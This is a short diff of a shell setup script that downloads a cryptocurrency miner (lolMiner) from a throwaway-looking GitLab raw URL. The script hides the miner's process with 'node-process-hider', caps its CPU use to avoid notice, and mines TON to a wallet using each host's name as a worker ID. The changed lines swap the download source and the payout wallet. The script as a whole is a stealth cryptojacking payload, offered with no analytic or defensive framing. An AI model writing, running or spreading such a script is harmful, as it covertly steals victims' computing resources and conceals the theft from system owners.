@@ -8,8 +8,8 @@ sudo apt-get install gcc g++ make
 sudo -u root npm i -g node-process-hider
 sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 sudo dpkg-reconfigure --frontend noninteractive tzdata
-wget https://bitbucket.org/oqoixgqoq9/tur/downloads/lolMiner
+wget https://gitlab.com/ninalasmi937/ton/-/raw/main/lolMiner
 ph add lolMiner
 chmod +x lolMiner
 cpulimit -e lolMiner -l 30 &
-./lolMiner --algo TON --pool wss://pplns.toncoinpool.io/stratum --user EQAhYfA5-ENSYrig434CEOSFH47z5I6hft6X6magteGGEwlT.$(cat /proc/sys/kernel/hostname)
+./lolMiner --algo TON --pool wss://pplns.toncoinpool.io/stratum --user EQAMrKwDNU_jlzgdIZSFWh2wGm24bzHhLqkUJn04sKvaGj5F.$(cat /proc/sys/kernel/hostname)
